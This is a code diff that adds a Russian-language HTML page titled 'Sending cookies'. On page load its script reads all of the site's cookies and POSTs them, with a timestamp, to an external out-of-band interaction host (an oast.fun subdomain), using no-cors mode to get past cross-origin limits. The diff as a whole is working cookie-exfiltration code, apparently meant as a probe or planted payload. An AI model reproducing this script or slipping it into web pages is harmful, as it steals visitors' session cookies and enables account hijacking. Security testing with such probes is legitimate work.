@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Отправка кук</title>
+</head>
+<body>
+    <h1>Отправка кук на удаленный сервер</h1>
+    <p>Если на этом сайте установлены cookies, они будут отправлены на указанный сервер.</p>
+
+    <script>
+        // Получаем все cookies
+        const cookies = document.cookie;
+
+        // Формируем данные для отправки
+        const data = {
+            cookies: cookies,
+            timestamp: new Date().toISOString()
+        };
+
+        // Отправляем данные на удаленный сервер с помощью fetch
+        fetch('https://rbpdypiimtovkmpbmwsom1c9paqgxlt2y.oast.fun ', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+            mode: 'no-cors' // Чтобы избежать проблем с CORS
+        })
+        .then(() => {
+            console.log('Cookies отправлены');
+        })
+        .catch(error => {
+            console.error('Ошибка при отправке:', error);
+        });
+    </script>
+</body>
+</html>
